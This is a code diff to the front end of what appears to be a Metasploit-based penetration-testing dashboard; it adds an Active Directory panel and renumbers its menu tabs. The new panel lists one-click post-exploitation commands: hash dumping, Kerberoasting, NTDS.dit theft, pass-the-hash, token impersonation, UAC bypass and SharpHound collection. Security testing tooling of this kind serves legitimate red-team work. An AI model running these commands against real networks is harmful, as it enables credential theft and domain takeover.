@@ -74,25 +74,26 @@ type ActionItem =
   | { type: 'divider'; label: string };
 
 const ACTIONS: ActionItem[] = [
-  { id: 1, label: '1. Vulnerability Scan' },
-  { id: 2, label: '2. Enumeration' },
-  { id: 3, label: '3. CVE Analysis' },
-  { id: 4, label: '4. Searchsploit' },
-  { id: 5, label: '5. Shells' },
-  { id: 6, label: '6. Post Exploitation' },
-  { id: 7, label: '7. Reporting' },
-  { id: 8, label: '8. Loot' },
-  { id: 9, label: '9. Notes' },
-  { id: 10, label: '10. Msfvenom Payload' },
+  { id: 1,  label: '1. Vulnerability Scan' },
+  { id: 2,  label: '2. Enumeration' },
+  { id: 3,  label: '3. CVE Analysis' },
+  { id: 4,  label: '4. Active Directory' },
+  { id: 5,  label: '5. Searchsploit' },
+  { id: 6,  label: '6. Shells' },
+  { id: 7,  label: '7. Post Exploitation' },
+  { id: 8,  label: '8. Reporting' },
+  { id: 9,  label: '9. Loot' },
+  { id: 10, label: '10. Notes' },
+  { id: 11, label: '11. Msfvenom Payload' },
   { type: 'divider', label: 'Password Attacks' },
-  { id: 11, label: "11. Wifi Handshake's" },
-  { id: 12, label: '12. Hashcat' },
-  { id: 13, label: '13. Bruteforce' },
-  { id: 14, label: '14. SqlMap' },
-  { id: 15, label: '15. FeroxBuster' },
-  { id: 16, label: '16. WPScan' },
+  { id: 12, label: "12. Wifi Handshake's" },
+  { id: 13, label: '13. Hashcat' },
+  { id: 14, label: '14. Bruteforce' },
+  { id: 15, label: '15. SqlMap' },
+  { id: 16, label: '16. FeroxBuster' },
+  { id: 17, label: '17. WPScan' },
   { type: 'divider', label: 'Tools' },
-  { id: 17, label: '17. Reset WiFi Adapters' },
+  { id: 18, label: '18. Reset WiFi Adapters' },
 ];
 
 // ── Quick command buttons ──
@@ -543,6 +544,130 @@ async function fetchGitHubRepos(cveID: string): Promise<{ repos: GitHubRepo[] | 
 
 const sleep = (ms: number) => new Promise<void>(r => setTimeout(r, ms));
 const NVD_DELAY_MS = 7000;
+
+// ── Active Directory panel ────────────────────────────────────────────────────
+
+interface ADGroup {
+  label: string;
+  cmds: { label: string; cmd: string }[];
+}
+
+const AD_GROUPS: ADGroup[] = [
+  {
+    label: 'Domain Enumeration',
+    cmds: [
+      { label: 'Enum domain info',       cmd: 'run post/windows/gather/enum_domain' },
+      { label: 'Enum domain users',      cmd: 'run post/windows/gather/enum_ad_users' },
+      { label: 'Enum domain groups',     cmd: 'run post/windows/gather/enum_ad_groups' },
+      { label: 'Enum domain computers',  cmd: 'run post/windows/gather/enum_ad_computers' },
+      { label: 'Enum domain controllers',cmd: 'run post/windows/gather/enum_domain_group_users GROUP="Domain Controllers"' },
+      { label: 'Enum logged-on users',   cmd: 'run post/windows/gather/enum_logged_on_users' },
+    ],
+  },
+  {
+    label: 'Credential Attacks',
+    cmds: [
+      { label: 'Dump hashes (hashdump)', cmd: 'hashdump' },
+      { label: 'Dump hashes (smart)',    cmd: 'run post/windows/gather/smart_hashdump GETSYSTEM=true' },
+      { label: 'Kerberoast (GetUserSPNs)',cmd: 'run post/windows/gather/kerberoast' },
+      { label: 'AS-REP Roast',           cmd: 'run post/windows/gather/get_np_users' },
+      { label: 'DCSync (secret dump)',   cmd: 'run post/windows/gather/credentials/credential_collector' },
+      { label: 'Dump NTDS.dit',          cmd: 'run post/windows/gather/ntds_grabber' },
+    ],
+  },
+  {
+    label: 'Lateral Movement',
+    cmds: [
+      { label: 'Pass-the-Hash (PTH)',    cmd: 'use exploit/windows/smb/psexec\nset SMBPass <NTLM_HASH>\nrun' },
+      { label: 'List SMB shares',        cmd: 'run post/windows/gather/enum_shares' },
+      { label: 'Enum network shares',    cmd: 'shell net view /all /domain' },
+      { label: 'Current token',          cmd: 'getuid' },
+      { label: 'List tokens',            cmd: 'use incognito\nlist_tokens -u' },
+      { label: 'Impersonate token',      cmd: 'impersonate_token "DOMAIN\\\\Administrator"' },
+    ],
+  },
+  {
+    label: 'Privilege Escalation',
+    cmds: [
+      { label: 'Get SYSTEM',             cmd: 'getsystem' },
+      { label: 'Check privs',            cmd: 'run post/multi/recon/local_exploit_suggester' },
+      { label: 'Enum GPO / SYSVOL',      cmd: 'run post/windows/gather/credentials/gpp' },
+      { label: 'Check AlwaysInstallElev',cmd: 'shell reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated' },
+      { label: 'Bypass UAC',             cmd: 'use exploit/windows/local/bypassuac_injection\nrun' },
+    ],
+  },
+  {
+    label: 'BloodHound Collection',
+    cmds: [
+      { label: 'Upload SharpHound',      cmd: 'upload /path/to/SharpHound.exe C:\\\\Windows\\\\Temp\\\\SharpHound.exe' },
+      { label: 'Run SharpHound (all)',    cmd: 'shell C:\\\\Windows\\\\Temp\\\\SharpHound.exe -c All --zipfilename bh_out.zip' },
+      { label: 'Download results',       cmd: 'download C:\\\\Windows\\\\Temp\\\\bh_out.zip' },
+    ],
+  },
+];
+
+function ActiveDirectoryPanel({ sessionId, targetHost }: { sessionId: number; targetHost: string }) {
+  const [activeGroup, setActiveGroup] = useState(0);
+  const [output, setOutput] = useState('');
+  const [running, setRunning] = useState(false);
+
+  const runCmd = async (cmd: string) => {
+    setRunning(true);
+    setOutput('');
+    try {
+      const res = await axios.post(`/api/sessions/${sessionId}/shell`, { command: cmd });
+      setOutput(res.data.output || '(no output)');
+    } catch (err: any) {
+      setOutput(err.response?.data?.error || err.message || 'Error');
+    } finally {
+      setRunning(false);
+    }
+  };
+
+  return (
+    <div className="action-panel">
+      <div className="action-panel-header">
+        <span className="action-panel-title">
+          Active Directory
+          {targetHost && <span className="action-panel-target"> — {targetHost}</span>}
+        </span>
+      </div>
+
+      <div className="ad-group-tabs">
+        {AD_GROUPS.map((g, i) => (
+          <button
+            key={g.label}
+            className={`ad-group-tab${activeGroup === i ? ' active' : ''}`}
+            onClick={() => setActiveGroup(i)}
+          >
+            {g.label}
+          </button>
+        ))}
+      </div>
+
+      <div className="ad-cmd-grid">
+        {AD_GROUPS[activeGroup].cmds.map(c => (
+          <button
+            key={c.label}
+            className="ad-cmd-btn"
+            disabled={running}
+            onClick={() => runCmd(c.cmd)}
+            title={c.cmd}
+          >
+            {c.label}
+          </button>
+        ))}
+      </div>
+
+      {(output || running) && (
+        <div className="ad-output-wrap">
+          <div className="ad-output-label">{running ? 'Running…' : 'Output'}</div>
+          <pre className="ad-output">{running ? '⌛ Waiting for response…' : output}</pre>
+        </div>
+      )}
+    </div>
+  );
+}
 
 // ── Searchsploit panel ────────────────────────────────────────────────────────
 
@@ -3488,12 +3613,12 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
 
   // Always refresh MSF sessions when opening the Shells tab
   useEffect(() => {
-    if (activeAction === 5) loadMsfSessions();
+    if (activeAction === 6) loadMsfSessions();
   }, [activeAction]); // eslint-disable-line react-hooks/exhaustive-deps
 
   // Load loot when opening the Loot tab
   useEffect(() => {
-    if (activeAction !== 8 || !sessionId) return;
+    if (activeAction !== 9 || !sessionId) return;
     setLootLoading(true);
     axios.get(`/api/sessions/${sessionId}/loot`)
       .then(res => setLootItems(res.data.items || []))
@@ -3503,7 +3628,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
 
   // Load notes when opening the Notes tab
   useEffect(() => {
-    if (activeAction !== 9 || !sessionId) return;
+    if (activeAction !== 10 || !sessionId) return;
     axios.get(`/api/sessions/${sessionId}/notes`)
       .then(res => setNotesText(res.data.notes || ''))
       .catch(() => {});
@@ -3850,7 +3975,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
                 key={action.id}
                 className={`action-item${activeAction === action.id ? ' active' : ''}`}
                 onClick={() => {
-                  if (action.id === 7) {
+                  if (action.id === 8) {
                     window.open(`/report/${sessionId}`, '_blank');
                   } else {
                     const next = activeAction === action.id ? null : action.id;
@@ -3871,7 +3996,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
         </aside>
 
         <main className="sd-main">
-          {activeAction !== 8 && activeAction !== 3 && activeAction !== 10 && activeAction !== 11 && activeAction !== 12 && activeAction !== 13 && activeAction !== 14 && activeAction !== 15 && activeAction !== 16 && activeAction !== 17 && (
+          {activeAction !== 9 && activeAction !== 3 && activeAction !== 11 && activeAction !== 12 && activeAction !== 13 && activeAction !== 14 && activeAction !== 15 && activeAction !== 16 && activeAction !== 17 && activeAction !== 18 && (
           <div className={`sd-console-wrap${consoleCollapsed ? ' sd-panel-collapsed' : ''}`}>
             <div className="sd-console-toggle-bar">
               <span className="sd-console-toggle-label">MSF Console</span>
@@ -4163,13 +4288,18 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
             </div>
           )}
 
-          {/* ── Searchsploit panel ── */}
+          {/* ── Active Directory panel ── */}
           {activeAction === 4 && (
+            <ActiveDirectoryPanel sessionId={sessionId} targetHost={session?.target_host || ''} />
+          )}
+
+          {/* ── Searchsploit panel ── */}
+          {activeAction === 5 && (
             <SearchsploitPanel sessionId={sessionId} targetHost={session?.target_host || ''} />
           )}
 
           {/* ── Shells panel ── */}
-          {activeAction === 5 && (
+          {activeAction === 6 && (
             <div className="action-panel">
               <div className="action-panel-header">
                 <span className="action-panel-title">
@@ -4268,7 +4398,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
           )}
 
           {/* ── Post Exploitation panel ── */}
-          {activeAction === 6 && (
+          {activeAction === 7 && (
             <div className="action-panel">
               <div className="action-panel-header">
                 <span className="action-panel-title">
@@ -4455,7 +4585,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
           )}
 
           {/* ── Loot panel ── */}
-          {activeAction === 8 && (
+          {activeAction === 9 && (
             <div className="action-panel action-panel-loot">
               <div className="action-panel-header">
                 <span className="action-panel-title">
@@ -4696,7 +4826,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
           )}
 
           {/* ── Notes panel ── */}
-          {activeAction === 9 && (
+          {activeAction === 10 && (
             <div className="action-panel notes-panel">
               <div className="action-panel-header">
                 <span className="action-panel-title">
@@ -4716,7 +4846,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
           )}
 
           {/* ── Msfvenom panel ── */}
-          {activeAction === 10 && (
+          {activeAction === 11 && (
             <div className="action-panel">
               <div className="action-panel-header">
                 <span className="action-panel-title">
@@ -4729,7 +4859,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
           )}
 
           {/* ── Wifi Handshake panel ── */}
-          {activeAction === 11 && (
+          {activeAction === 12 && (
             <div className="action-panel">
               <div className="action-panel-header">
                 <span className="action-panel-title">Wifi Handshakes</span>
@@ -4739,7 +4869,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
           )}
 
           {/* ── Hashcat panel ── */}
-          {activeAction === 12 && (
+          {activeAction === 13 && (
             <div className="action-panel">
               <div className="action-panel-header">
                 <span className="action-panel-title">
@@ -4752,7 +4882,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
           )}
 
           {/* ── Bruteforce panel ── */}
-          {activeAction === 13 && (
+          {activeAction === 14 && (
             <div className="action-panel">
               <div className="action-panel-header">
                 <span className="action-panel-title">
@@ -4765,7 +4895,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
           )}
 
           {/* ── SqlMap panel ── */}
-          {activeAction === 14 && (
+          {activeAction === 15 && (
             <div className="action-panel">
               <div className="action-panel-header">
                 <span className="action-panel-title">
@@ -4778,7 +4908,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
           )}
 
           {/* ── FeroxBuster panel ── */}
-          {activeAction === 15 && (
+          {activeAction === 16 && (
             <div className="action-panel">
               <div className="action-panel-header">
                 <span className="action-panel-title">
@@ -4791,7 +4921,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
           )}
 
           {/* ── WPScan panel ── */}
-          {activeAction === 16 && (
+          {activeAction === 17 && (
             <div className="action-panel">
               <div className="action-panel-header">
                 <span className="action-panel-title">
@@ -4804,7 +4934,7 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
           )}
 
           {/* ── Reset WiFi Adapters panel ── */}
-          {activeAction === 17 && (
+          {activeAction === 18 && (
             <div className="action-panel">
               <div className="action-panel-header">
                 <span className="action-panel-title">Reset WiFi Adapters</span>
